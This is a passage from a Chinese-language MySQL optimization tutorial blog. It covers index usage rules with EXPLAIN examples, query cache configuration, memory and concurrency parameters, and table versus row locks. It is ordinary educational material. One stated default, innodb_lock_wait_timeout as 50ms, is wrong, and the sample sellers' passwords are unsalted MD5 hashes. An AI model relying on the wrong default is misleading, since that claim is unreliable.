values(&#39;alibaba&#39;,&#39;阿里巴巴&#39;,&#39;阿里小店&#39;,&#39;e10adc3949ba59abbe56e057f20f883e&#39;,&#39;1&#39;,&#39;北京市&#39;,&#39;2088-01-01 12:00:00&#39;);</span><br><span class="line">insert into &#96;tb_seller&#96; (&#96;sellerid&#96;, &#96;name&#96;, &#96;nickname&#96;, &#96;password&#96;, &#96;status&#96;, &#96;address&#96;, &#96;createtime&#96;) values(&#39;baidu&#39;,&#39;百度科技有限公司&#39;,&#39;百度小店&#39;,&#39;e10adc3949ba59abbe56e057f20f883e&#39;,&#39;1&#39;,&#39;北京市&#39;,&#39;2088-01-01 12:00:00&#39;);</span><br><span class="line">insert into &#96;tb_seller&#96; (&#96;sellerid&#96;, &#96;name&#96;, &#96;nickname&#96;, &#96;password&#96;, &#96;status&#96;, &#96;address&#96;, &#96;createtime&#96;) values(&#39;huawei&#39;,&#39;华为科技有限公司&#39;,&#39;华为小店&#39;,&#39;e10adc3949ba59abbe56e057f20f883e&#39;,&#39;0&#39;,&#39;北京市&#39;,&#39;2088-01-01 12:00:00&#39;);</span><br><span class="line">insert into &#96;tb_seller&#96; (&#96;sellerid&#96;, &#96;name&#96;, &#96;nickname&#96;, &#96;password&#96;, &#96;status&#96;, &#96;address&#96;, &#96;createtime&#96;) values(&#39;itcast&#39;,&#39;传智播客教育科技有限公司&#39;,&#39;传智播客&#39;,&#39;e10adc3949ba59abbe56e057f20f883e&#39;,&#39;1&#39;,&#39;北京市&#39;,&#39;2088-01-01 12:00:00&#39;);</span><br><span class="line">insert into &#96;tb_seller&#96; (&#96;sellerid&#96;, &#96;name&#96;, &#96;nickname&#96;, &#96;password&#96;, &#96;status&#96;, &#96;address&#96;, &#96;createtime&#96;) values(&#39;itheima&#39;,&#39;黑马程序员&#39;,&#39;黑马程序员&#39;,&#39;e10adc3949ba59abbe56e057f20f883e&#39;,&#39;0&#39;,&#39;北京市&#39;,&#39;2088-01-01 12:00:00&#39;);</span><br><span class="line">insert into &#96;tb_seller&#96; (&#96;sellerid&#96;, &#96;name&#96;, &#96;nickname&#96;, &#96;password&#96;, &#96;status&#96;, &#96;address&#96;, &#96;createtime&#96;) values(&#39;luoji&#39;,&#39;罗技科技有限公司&#39;,&#39;罗技小店&#39;,&#39;e10adc3949ba59abbe56e057f20f883e&#39;,&#39;1&#39;,&#39;北京市&#39;,&#39;2088-01-01 12:00:00&#39;);</span><br><span class="line">insert into &#96;tb_seller&#96; (&#96;sellerid&#96;, &#96;name&#96;, &#96;nickname&#96;, &#96;password&#96;, &#96;status&#96;, &#96;address&#96;, &#96;createtime&#96;) values(&#39;oppo&#39;,&#39;OPPO科技有限公司&#39;,&#39;OPPO官方旗舰店&#39;,&#39;e10adc3949ba59abbe56e057f20f883e&#39;,&#39;0&#39;,&#39;北京市&#39;,&#39;2088-01-01 12:00:00&#39;);</span><br><span class="line">insert into &#96;tb_seller&#96; (&#96;sellerid&#96;, &#96;name&#96;, &#96;nickname&#96;, &#96;password&#96;, &#96;status&#96;, &#96;address&#96;, &#96;createtime&#96;) values(&#39;ourpalm&#39;,&#39;掌趣科技股份有限公司&#39;,&#39;掌趣小店&#39;,&#39;e10adc3949ba59abbe56e057f20f883e&#39;,&#39;1&#39;,&#39;北京市&#39;,&#39;2088-01-01 12:00:00&#39;);</span><br><span class="line">insert into &#96;tb_seller&#96; (&#96;sellerid&#96;, &#96;name&#96;, &#96;nickname&#96;, &#96;password&#96;, &#96;status&#96;, &#96;address&#96;, &#96;createtime&#96;) values(&#39;qiandu&#39;,&#39;千度科技&#39;,&#39;千度小店&#39;,&#39;e10adc3949ba59abbe56e057f20f883e&#39;,&#39;2&#39;,&#39;北京市&#39;,&#39;2088-01-01 12:00:00&#39;);</span><br><span class="line">insert into &#96;tb_seller&#96; (&#96;sellerid&#96;, &#96;name&#96;, &#96;nickname&#96;, &#96;password&#96;, &#96;status&#96;, &#96;address&#96;, &#96;createtime&#96;) values(&#39;sina&#39;,&#39;新浪科技有限公司&#39;,&#39;新浪官方旗舰店&#39;,&#39;e10adc3949ba59abbe56e057f20f883e&#39;,&#39;1&#39;,&#39;北京市&#39;,&#39;2088-01-01 12:00:00&#39;);</span><br><span class="line">insert into &#96;tb_seller&#96; (&#96;sellerid&#96;, &#96;name&#96;, &#96;nickname&#96;, &#96;password&#96;, &#96;status&#96;, &#96;address&#96;, &#96;createtime&#96;) values(&#39;xiaomi&#39;,&#39;小米科技&#39;,&#39;小米官方旗舰店&#39;,&#39;e10adc3949ba59abbe56e057f20f883e&#39;,&#39;1&#39;,&#39;西安市&#39;,&#39;2088-01-01 12:00:00&#39;);</span><br><span class="line">insert into &#96;tb_seller&#96; (&#96;sellerid&#96;, &#96;name&#96;, &#96;nickname&#96;, &#96;password&#96;, &#96;status&#96;, &#96;address&#96;, &#96;createtime&#96;) values(&#39;yijia&#39;,&#39;宜家家居&#39;,&#39;宜家家居旗舰店&#39;,&#39;e10adc3949ba59abbe56e057f20f883e&#39;,&#39;1&#39;,&#39;北京市&#39;,&#39;2088-01-01 12:00:00&#39;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create index idx_seller_name_sta_addr on tb_seller(name,status,address);</span><br></pre></td></tr></table></figure>

<h3 id="避免索引失效"><a href="#避免索引失效" class="headerlink" title="避免索引失效"></a>避免索引失效</h3><h4 id="全值索引"><a href="#全值索引" class="headerlink" title="全值索引"></a>全值索引</h4><p>对索引中所有列都指定具体值，该情况下，索引生效，执行效率高。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">explain select * from tb_seller where name&#x3D;&#39;小米科技&#39; and status&#x3D;&#39;1&#39; and address&#x3D;&#39;北京市&#39;\G;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/ss.png" alt="image-20201020161200971"></p>
<h4 id="最左前缀法则"><a href="#最左前缀法则" class="headerlink" title="最左前缀法则"></a>最左前缀法则</h4><p>指的是查询从索引的<strong>最左前列开始，并且不跳过索引中的列。</strong>(爬楼梯)</p>
<img src="https://csn.damyoung.cn/ss.png" alt="image-20201020161615741" style="zoom:80%;" />

<img src="https://csn.damyoung.cn/ss.png" alt="image-20201020161638749" style="zoom:80%;" />

<blockquote>
<p>与顺序无关，而与是否有字段有关</p>
</blockquote>
<p><img src="https://csn.damyoung.cn/image-20201020161907488.png" alt="image-20201020161907488"></p>
<blockquote>
<p>跳过status,只有name有索引，address无索引</p>
</blockquote>
<img src="https://csn.damyoung.cn/image-20201020162055081.png" alt="image-20201020162055081" style="zoom:80%;" />

<h4 id="范围查询"><a href="#范围查询" class="headerlink" title="范围查询"></a>范围查询</h4><ul>
<li>范围查询右边的列，不能使用索引 。</li>
</ul>
<blockquote>
<p>根据前面的两个字段name ， status 查询是走索引的， 但是最后一个条件<strong>address 没有用到索引。</strong></p>
</blockquote>
<p><img src="https://csn.damyoung.cn/image-20201020163038952.png" alt="image-20201020163038952"></p>
<h4 id="运算操作"><a href="#运算操作" class="headerlink" title="运算操作"></a>运算操作</h4><blockquote>
<p>不要在索引列上进行运算操作， 索引将失效。</p>
</blockquote>
<img src="https://csn.damyoung.cn/image-20201020163325815.png" alt="image-20201020163325815" style="zoom:80%;" />

<h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><ul>
<li>字符串不加单引号，造成索引失效。</li>
</ul>
<blockquote>
<p>数字也要，否则不走索引(不加单引号，底层进行隐式运算操作)</p>
</blockquote>
<p><img src="https://csn.damyoung.cn/image-20201020163529790.png" alt="image-20201020163529790"></p>
<h4 id="使用覆盖索引"><a href="#使用覆盖索引" class="headerlink" title="使用覆盖索引"></a>使用覆盖索引</h4><ul>
<li>尽量使用覆盖索引，避免select*</li>
</ul>
<blockquote>
<p>尽量使用<strong>覆盖索引</strong>（只访问索引的查询（索引列完全包含查询列）），减少select * 。</p>
<ul>
<li>但<strong>查询非索引字段还是需要回表查询</strong></li>
</ul>
</blockquote>
<p><img src="https://csn.damyoung.cn/image-20201020163837667.png" alt="image-20201020163837667"></p>
<p><strong>ps</strong></p>
<blockquote>
<ul>
<li><p>using index ：使用覆盖索引的时候就会出现</p>
</li>
<li><p>using where：在查找使用索引的情况下，需要回表去查询所需的数据</p>
</li>
<li><p>using index condition：查找使用了索引，但是需要回表查询数据</p>
</li>
<li><p>using index ; using where：查找使用了索引，但是需要的数据都在索引列中能找到，所以不需要回表查询数据    </p>
</li>
</ul>
</blockquote>
<h4 id="or"><a href="#or" class="headerlink" title="or"></a>or</h4><ul>
<li>用or分割开的条件， 如果or前的条件中的列有索引，而后面的列中没有索引，那么涉及的索引都不会被用到。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">explain select * from tb_seller where name&#x3D;&#39;黑马程序员&#39; or createtime &#x3D; &#39;2088-01-01 12:00:00&#39;\G;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20201020164303908.png" alt="image-20201020164303908"></p>
<h4 id="模糊查询"><a href="#模糊查询" class="headerlink" title="%模糊查询"></a>%模糊查询</h4><ul>
<li>以%开头的Like模糊查询，索引失效。</li>
</ul>
<blockquote>
<p>如果仅仅是尾部模糊匹配，索引不会失效。如果是头部模糊匹配，索引失效。</p>
</blockquote>
<p><img src="https://csn.damyoung.cn/image-20201020164653957.png" alt="image-20201020164653957"></p>
<p><strong>解决：用覆盖索引解决</strong></p>
<p><img src="https://csn.damyoung.cn/image-20201020164819251.png" alt="image-20201020164819251"></p>
<p><img src="https://csn.damyoung.cn/image-20201020165132336.png" alt="image-20201020165132336"></p>
<h4 id="全表索引更快"><a href="#全表索引更快" class="headerlink" title="全表索引更快"></a>全表索引更快</h4><ul>
<li>如果MySQL评估使用索引比全表更慢，则不使用索引</li>
</ul>
<p><img src="https://csn.damyoung.cn/image-20201020172558272.png" alt="image-20201020172558272"></p>
<h4 id="is-not-null"><a href="#is-not-null" class="headerlink" title="is not null"></a>is not null</h4><ul>
<li>is  NULL ， is NOT NULL  <font color='red'>有时</font>索引失效。</li>
</ul>
<blockquote>
<p>因为当前字段null是少量的</p>
</blockquote>
<p><img src="https://csn.damyoung.cn/image-20201020172804973.png" alt="image-20201020172804973"></p>
<h4 id="not-in"><a href="#not-in" class="headerlink" title="not in"></a>not in</h4><ul>
<li>in 走索引， not in索引失效</li>
</ul>
<p><img src="https://csn.damyoung.cn/image-20201020173302116.png" alt="image-20201020173302116"></p>
<h4 id="单列索引"><a href="#单列索引" class="headerlink" title="单列索引"></a>单列索引</h4><ul>
<li>单列索引和复合索引。</li>
</ul>
<blockquote>
<p>尽量使用复合索引，而少使用单列索引 。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create index idx_name_sta_address on tb_seller(name, status, address);</span><br><span class="line"></span><br><span class="line">就相当于创建了三个索引 ： </span><br><span class="line">	name</span><br><span class="line">	name + status</span><br><span class="line">	name + status + address</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create index idx_seller_name on tb_seller(name);</span><br><span class="line">create index idx_seller_status on tb_seller(status);</span><br><span class="line">create index idx_seller_address on tb_seller(address);</span><br><span class="line"></span><br><span class="line">数据库会选择一个最优的索引（辨识度最高索引）来使用，并不会使用全部索引 。</span><br></pre></td></tr></table></figure>

<h3 id="查看索引使用情况"><a href="#查看索引使用情况" class="headerlink" title="查看索引使用情况"></a>查看索引使用情况</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 当前会话使用情况</span><br><span class="line">show status like &#39;Handler_read%&#39;;	</span><br><span class="line"></span><br><span class="line">show global status like &#39;Handler_read%&#39;;	</span><br></pre></td></tr></table></figure>

<img src="https://csn.damyoung.cn/image-20201020173925206.png" alt="image-20201020173925206" style="zoom:80%;" />

<blockquote>
<ul>
<li><p>Handler_read_first：索引中第一条被读的次数。如果较高，表示服务器正执行大量全索引扫描（这个值越低越好）。</p>
</li>
<li><p>Handler_read_key：如果索引正在工作，这个值代表一个行被索引值读的次数，如果值越低，表示索引得到的性能改善不高，因为索引不经常使用（这个值越高越好）。</p>
</li>
<li><p>Handler_read_next ：按照键顺序读下一行的请求数。如果你用范围约束或如果执行索引扫描来查询索引列，该值增加。</p>
</li>
<li><p>Handler_read_prev：按照键顺序读前一行的请求数。该读方法主要用于优化ORDER BY … DESC。</p>
</li>
<li><p>Handler_read_rnd ：根据固定位置读一行的请求数。如果你正执行大量查询并需要对结果进行排序该值较高。你可能使用了大量需要MySQL扫描整个表的查询或你的连接没有正确使用键。这个值较高，意味着运行效率低，应该建立索引来补救。</p>
</li>
<li><p>Handler_read_rnd_next：在数据文件中读下一行的请求数。如果你正进行大量的表扫描，该值较高。通常说明你的表索引不正确或写入的查询没有利用索引。</p>
</li>
</ul>
</blockquote>
<h1 id="应用优化"><a href="#应用优化" class="headerlink" title="应用优化"></a>应用优化</h1><h2 id="使用连接池"><a href="#使用连接池" class="headerlink" title="使用连接池"></a>使用连接池</h2><p>建立连接的代价的比较昂贵的，因为我们频繁的创建关闭连接，是比较耗费资源</p>
<p>我们有必要建立数据库连接池，以提高访问的性能。</p>
<h2 id="减少对MySql的访问"><a href="#减少对MySql的访问" class="headerlink" title="减少对MySql的访问"></a>减少对MySql的访问</h2><h3 id="避免数据重复检索"><a href="#避免数据重复检索" class="headerlink" title="避免数据重复检索"></a>避免数据重复检索</h3><p>要向数据库提交两次请求，数据库就要做两次查询操作</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select id , name from tb_book;</span><br><span class="line">select id , status from tb_book;</span><br></pre></td></tr></table></figure>

<p>优化后：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select id, name , status from tb_book;</span><br></pre></td></tr></table></figure>

<h3 id="增加cache层"><a href="#增加cache层" class="headerlink" title="增加cache层"></a>增加cache层</h3><blockquote>
<p>在应用中，我们可以在应用中增加 <strong>缓存层</strong> 来达到<strong>减轻数据库负担</strong>的目的</p>
<ul>
<li>可以部分数据从数据库中抽取出来放到应用端以文本方式存储</li>
<li>使用框架(Mybatis, Hibernate)提供的一级缓存/二级缓存</li>
<li>使用redis数据库来缓存数据 </li>
</ul>
</blockquote>
<h2 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h2><p>利用某种均衡算法，将固定的负载量分布到不同的服务器上， 以此来降低单台服务器的负载，达到优化的效果</p>
<h3 id="利用MySql复制分流查询"><a href="#利用MySql复制分流查询" class="headerlink" title="利用MySql复制分流查询"></a>利用MySql复制分流查询</h3><p>通过MySql的主从复制，实现读写分离，使增删改操作走主节点，查询操作走从节点，从而降低单台服务器的压力</p>
<img src="https://csn.damyoung.cn/1.jpg" style="zoom:80%;" />

<h3 id="采用分布式数据库架构"><a href="#采用分布式数据库架构" class="headerlink" title="采用分布式数据库架构"></a>采用分布式数据库架构</h3><p>分布式数据库架构适合大数据量、负载高的情况，有良好的拓展性和高可用性，通过在多台服务器之间分布数据，可以实现多台服务器间的负载均衡，提高访问效率。</p>
<h1 id="查询缓存"><a href="#查询缓存" class="headerlink" title="查询缓存"></a>查询缓存</h1><p>开启MySql的查询缓存时，当<strong>执行完全相同</strong>的Sql语句时，服务器就会直接从缓存中读取结果。</p>
<blockquote>
<p>当数据被修改，之前的缓存会失效，<strong>修改比较频繁的表不适合做查询缓存。</strong></p>
</blockquote>
<h2 id="操作流程"><a href="#操作流程" class="headerlink" title="操作流程"></a>操作流程</h2><img src="https://csn.damyoung.cn/20180919131632347.png" alt="20180919131632347" style="zoom:80%;" />

<blockquote>
<ul>
<li>客户端发送一条查询给服务器server；</li>
<li>服务器先会检查查询缓存，如果命中了缓存，则立即返回存储在缓存中的结果。否则进入下一阶段；</li>
<li>服务器端进行SQL解析、预处理，再由优化器<code>optimiter</code>生成对应的执行计划；</li>
<li>MySQL根据优化器生成的执行计划，调用存储引擎的API来执行查询；</li>
<li>将结果返回给客户端，同时将结果缓存在缓存层中。</li>
</ul>
</blockquote>
<h2 id="查询缓存配置"><a href="#查询缓存配置" class="headerlink" title="查询缓存配置"></a>查询缓存配置</h2><blockquote>
<p>查看是否支持查询缓存</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables like &#39;have_query_cache&#39;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>查看是否开启了查询缓存</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables like &#39;query_cache_type&#39;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>查看查询缓存的占用大小</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables like &#39;query_cache_size&#39;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>查看查询缓存的状态变量</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show status like &#39;Qcache%&#39;;</span><br></pre></td></tr></table></figure>

<img src="https://csn.damyoung.cn/image-20201021231234834.png" alt="image-20201021231234834" style="zoom:80%;" />

<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>Qcache_free_blocks</td>
<td>查询缓存中的可用内存块数</td>
</tr>
<tr>
<td>Qcache_free_memory</td>
<td>查询缓存的可用内存量</td>
</tr>
<tr>
<td>Qcache_hits</td>
<td>查询缓存命中数</td>
</tr>
<tr>
<td>Qcache_inserts</td>
<td>添加到查询缓存的查询数</td>
</tr>
<tr>
<td>Qcache_lowmen_prunes</td>
<td>由于内存不足而从查询缓存中删除的查询数</td>
</tr>
<tr>
<td>Qcache_not_cached</td>
<td>非缓存查询的数量（由于 query_cache_type 设置而无法缓存或未缓存）</td>
</tr>
<tr>
<td>Qcache_queries_in_cache</td>
<td>查询缓存中注册的查询数</td>
</tr>
<tr>
<td>Qcache_total_blocks</td>
<td>查询缓存中的块总数</td>
</tr>
</tbody></table>
<h2 id="开启查询缓存"><a href="#开启查询缓存" class="headerlink" title="开启查询缓存"></a>开启查询缓存</h2><table>
<thead>
<tr>
<th>值</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>OFF 或 0</td>
<td>查询缓存功能关闭</td>
</tr>
<tr>
<td>ON 或 1</td>
<td>查询缓存功能打开，SELECT的结果符合缓存条件即会缓存，否则，不予缓存，显式指定 SQL_NO_CACHE，不予缓存</td>
</tr>
<tr>
<td>DEMAND 或 2</td>
<td>查询缓存功能按需进行，显式指定 <strong>sql_cache</strong> 的SELECT语句才会缓存；其它均不予缓存</td>
</tr>
</tbody></table>
<blockquote>
<p>在/etc/my.cnf配置中，增加配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">query_cache_type&#x3D;1;</span><br></pre></td></tr></table></figure>

<img src="https://csn.damyoung.cn/image-20201021234236344.png" alt="image-20201021234236344" style="zoom:80%;" />

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl restart mysql.service;</span><br></pre></td></tr></table></figure>
</blockquote>
<img src="https://csn.damyoung.cn/image-20201021234210231.png" alt="image-20201021234210231" style="zoom:80%;" />

<h2 id="查询缓存select选项"><a href="#查询缓存select选项" class="headerlink" title="查询缓存select选项"></a>查询缓存select选项</h2><blockquote>
<ul>
<li><p>sql_cache：如果查询结果是可缓存的，并且 query_cache_type 系统变量的值为ON或 DEMAND ，则缓存查询结果 。</p>
</li>
<li><p>sql_no_cache：服务器不使用查询缓存。它既不检查查询缓存，也不检查结果是否已缓存，也不缓存查询结果。</p>
</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select sql_cache username from tb_user_1 where id&#x3D;1;</span><br><span class="line">SELECT SQL_NO_CACHE id, name FROM customer;</span><br></pre></td></tr></table></figure>

<img src="https://csn.damyoung.cn/image-20201021235706488.png" alt="image-20201021235706488" style="zoom:80%;" />

<img src="https://csn.damyoung.cn/image-20201021235401748.png" alt="image-20201021235401748" style="zoom:80%;" />

<h2 id="缓存失效"><a href="#缓存失效" class="headerlink" title="缓存失效"></a>缓存失效</h2><p>要想命中缓存，<strong>sql语句必须完全相同</strong></p>
<h3 id="存在不确定"><a href="#存在不确定" class="headerlink" title="存在不确定"></a>存在不确定</h3><blockquote>
<p>查询语句中有一些不确定函数时，则不会缓存。</p>
<p>如 now() , current_date() , curdate() , curtime() , rand() , uuid() , user() , database() 。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SQL1 : select * from tb_item where updatetime &lt; now() limit 1;</span><br><span class="line">SQL2 : select user();</span><br><span class="line">SQL3 : select database();</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20201022000250422.png" alt="image-20201022000250422"></p>
<h3 id="不使用任何表查询"><a href="#不使用任何表查询" class="headerlink" title="不使用任何表查询"></a>不使用任何表查询</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &#39;a&#39;;</span><br></pre></td></tr></table></figure>

<h3 id="查询系统表"><a href="#查询系统表" class="headerlink" title="查询系统表"></a>查询系统表</h3><blockquote>
<p>查询 mysql， information_schema或  performance_schema 数据库中的表时，不会走查询缓存。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from information_schema.engines;</span><br></pre></td></tr></table></figure>

<p>在<strong>存储函数，触发器或事件</strong>的主体内执行的查询。</p>
<blockquote>
<p>如果<strong>表更改</strong>，则使用该表的所有高速缓存查询都将变为无效并从高速缓存中删除。</p>
<ul>
<li>用<code>MERGE</code>映射到已更改表的表的查询。</li>
<li>一个表可以被许多类型的语句，如被改变 insert， update， delete， truncate table，alter table，drop table 或 drop database; </li>
</ul>
</blockquote>
<h1 id="MySql内存管理及优化"><a href="#MySql内存管理及优化" class="headerlink" title="MySql内存管理及优化"></a>MySql内存管理及优化</h1><h2 id="内存优化原则"><a href="#内存优化原则" class="headerlink" title="内存优化原则"></a>内存优化原则</h2><ul>
<li>将尽量多的内存分配给MySQL做缓存，但要给操作系统和其他程序预留足够内存</li>
<li>MyISAM<code> 存储引擎的数据文件读取**依赖于操作系统自身的IO缓存**，因此，如果有</code>MyISAM`表，就要预留更多的内存给操作系统做IO缓存</li>
<li><strong>排序区、连接区</strong>等缓存是分配给每个数据库会话（session）专用的，<strong>其默认值的设置要根据最大连接数合理分配</strong>，如果设置太大，不但浪费资源，而且在并发连接较高时会导致物理内存耗尽</li>
</ul>
<h2 id="MyISAM内存优化"><a href="#MyISAM内存优化" class="headerlink" title="MyISAM内存优化"></a>MyISAM内存优化</h2><p>myisam存储引擎使用 key_buffer 缓存<strong>索引块</strong>，加速myisam索引的读写速度。</p>
<p>对于myisam表的<strong>数据块</strong>，mysql没有特别的缓存机制，完全依赖于操作系统的IO缓存。</p>
<p><strong>key_buffer_size</strong></p>
<blockquote>
<p>key_buffer_size决定MyISAM<strong>索引块缓存区</strong>的大小，直接影响到MyISAM表的存取效率。</p>
<p>在MySQL参数文件(<code>/usr/my.cnf</code>)中设置key_buffer_size的值，对于一般MyISAM数据库，建议至少将1/4可用内存分配给key_buffer_size。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">key_buffer_size&#x3D;512M</span><br></pre></td></tr></table></figure>

<img src="https://csn.damyoung.cn/image-20201022001306901.png" alt="image-20201022001306901" style="zoom:80%;" />

<p><strong>read_buffer_size</strong></p>
<blockquote>
<p>如果需要经常<strong>顺序扫描</strong>myisam表，可以通过增大read_buffer_size的值来改善性能。</p>
<p>但需要注意的是read_buffer_size是<strong>每个session独占</strong>的，如果默认值设置太大，就会造成内存浪费</p>
</blockquote>
<p><strong>read_rnd_buffer_size</strong></p>
<blockquote>
<p>对于需要做排序的myisam表的查询，如带有<strong>order by</strong>子句的sql，适当增加 read_rnd_buffer_size 的值，可以改善此类的sql性能。</p>
<p>但需要注意的是 read_rnd_buffer_size 是<strong>每个session独占</strong>的，如果默认值设置太大，就会造成内存浪费。</p>
</blockquote>
<h2 id="InnoDB内存优化"><a href="#InnoDB内存优化" class="headerlink" title="InnoDB内存优化"></a>InnoDB内存优化</h2><blockquote>
<p>innodb用<strong>一块内存区做IO缓存池</strong></p>
<p>该缓存池不仅用来缓存innodb的索引块，而且也用来缓存innodb的数据块。</p>
</blockquote>
<p><strong>innodb_buffer_pool_size</strong></p>
<blockquote>
<p>决定了 innodb 存储引擎<strong>表数据</strong>和<strong>索引数据</strong>的最大缓存区大小</p>
<p>在保证操作系统及其他程序有足够内存可用的情况下，innodb_buffer_pool_size 的值越大，<strong>缓存命中率越高，访问InnoDB表需要的磁盘I/O 就越少，性能也就越高。</strong></p>
</blockquote>
<p><strong>innodb_log_buffer_size</strong></p>
<blockquote>
<p>决定了innodb重做<strong>日志缓存</strong>的大小，对于可能产生大量更新记录的大事务，增加innodb_log_buffer_size的大小，可以避免innodb在事务提交前就执行不必要的日志写入磁盘操作。</p>
</blockquote>
<h1 id="Mysql并发参数调整"><a href="#Mysql并发参数调整" class="headerlink" title="Mysql并发参数调整"></a>Mysql并发参数调整</h1><p>MySql Server是多线程结构，包括后台线程和客户服务线程。</p>
<p>多线程有效利用服务器资源，对并发参数的调优，提高数据库的并发性能。</p>
<h2 id="max-connections"><a href="#max-connections" class="headerlink" title="max_connections"></a>max_connections</h2><p>允许连接到MySQL数据库的最大数量，默认值是 151.</p>
<blockquote>
<p>如果状态变量 connection_errors_max_connections 不为零，并且一直增长，则说明不断有连接请求因数据库连接数已达到允许最大值而失败，这是可以考虑增大max_connections 的值。</p>
<p>最大支持连接数取决于，操作系统平台的线程库的质量、内存大小、每个连接的负荷、CPU的处理速度，期望的响应时间等</p>
</blockquote>
<h2 id="back-log"><a href="#back-log" class="headerlink" title="back_log"></a>back_log</h2><p>控制MySQL监听TCP端口时设置的<strong>积压请求栈大小</strong></p>
<blockquote>
<p>MySql的连接数<strong>达到max_connections</strong>时，新来的请求将会被存在堆栈中，以等待某一连接释放资源，该堆栈的数量即back_log，如果等待连接的数量<strong>超过</strong>back_log，将不被授予连接资源，将会报错</p>
</blockquote>
<blockquote>
<p>如果需要数据库在较短的时间内处理大量连接请求， 可以考虑适当增大back_log 的值。</p>
</blockquote>
<h2 id="table-open-cache"><a href="#table-open-cache" class="headerlink" title="table_open_cache"></a>table_open_cache</h2><p>用来控制所有SQL语句执行线程可打开<strong>表缓存的数量</strong></p>
<p>执行SQL语句时，<strong>每一个SQL执行线程</strong>至少要打开 1 个表缓存</p>
<blockquote>
<p>值应该根据设置的最大连接数 max_connections 以及每个连接执行关联查询中涉及的表 N 的最大数量来设定 ：max_connections x N </p>
</blockquote>
<h2 id="thread-cache-size"><a href="#thread-cache-size" class="headerlink" title="thread_cache_size"></a>thread_cache_size</h2><p>为了加快连接数据库的速度，MySQL 会缓存一定数量的<strong>客户服务线程</strong>以备重用</p>
<blockquote>
<p>thread_cache_size 可控制 MySQL 缓存客户服务线程的数量。</p>
</blockquote>
<h2 id="innodb-lock-wait-timeout"><a href="#innodb-lock-wait-timeout" class="headerlink" title="innodb_lock_wait_timeout"></a>innodb_lock_wait_timeout</h2><p>设置InnoDB 事务<strong>等待行锁的时间</strong>，默认值是50ms ， 可以根据需要进行动态设置</p>
<blockquote>
<ul>
<li>对于需要快速反馈的业务系统来说，可以将行锁的等待时间调小，以避免事务长时间挂起； </li>
<li>对于后台运行的批量处理程序来说， 可以将行锁的等待时间调大， 以避免发生大的回滚操作。</li>
</ul>
</blockquote>
<h1 id="MySql锁"><a href="#MySql锁" class="headerlink" title="MySql锁"></a>MySql锁</h1><p>锁是计算机协调多个进程或线程并发访问某一资源的机制（避免争抢）。</p>
<p>如何保证数据<strong>并发访问的一致性、有效性</strong>是所有数据库必须解决的一个问题，<strong>锁冲突</strong>也是影响数据库并发访问性能的一个重要因素</p>
<h2 id="锁分类"><a href="#锁分类" class="headerlink" title="锁分类"></a>锁分类</h2><blockquote>
<p>对数据操作的粒度</p>
</blockquote>
<ul>
<li>表锁：操作时，会锁定整个表</li>
<li>行锁：操作时，会锁定当前操作行</li>
</ul>
<blockquote>
<p>数据操作的类型</p>
</blockquote>
<ul>
<li><p>读锁(共享)：针对同一份数据，多个读操作可以同时进行而不会互相影响。</p>
</li>
<li><p>写锁(互斥)：当前操作没有完成之前，它会阻断其他写锁和读锁。</p>
</li>
</ul>
<h2 id="MySql锁-1"><a href="#MySql锁-1" class="headerlink" title="MySql锁"></a>MySql锁</h2><p>表级锁更适合于<strong>以查询为主，只有少量按索引条件更新数据</strong>的应用，如Web 应用；</p>
<p>行级锁则更适合于有大量<strong>按索引条件</strong>并发更新少量不同数据，同时又有并查询的应用，如一些在线事务处理（OLTP）系统。</p>
<table>
<thead>
<tr>
<th>存储引擎</th>
<th>表级锁</th>
<th>行级锁</th>
<th>页面锁</th>
</tr>
</thead>
<tbody><tr>
<td>MyISAM</td>
<td>支持</td>
<td>不支持</td>
<td>不支持</td>
</tr>
<tr>
<td>InnoDB</td>
<td>支持</td>
<td>支持</td>
<td>不支持</td>
</tr>
<tr>
<td>MEMORY</td>
<td>支持</td>
<td>不支持</td>
<td>不支持</td>
</tr>
<tr>
<td>BDB</td>
<td>支持</td>
<td>不支持</td>
<td>支持</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>锁类型</th>
<th>特点</th>
</tr>
</thead>
<tbody><tr>
<td>表级锁</td>
<td>偏向MyISAM 存储引擎，开销小，加锁快；不会出现死锁；锁定粒度大，发生锁冲突的概率最高,并发度最低。</td>
</tr>
<tr>
<td>行级锁</td>
<td>偏向InnoDB 存储引擎，开销大，加锁慢；会出现死锁；锁定粒度最小，发生锁冲突的概率最低,并发度也最高。</td>
</tr>
<tr>
<td>页面锁</td>
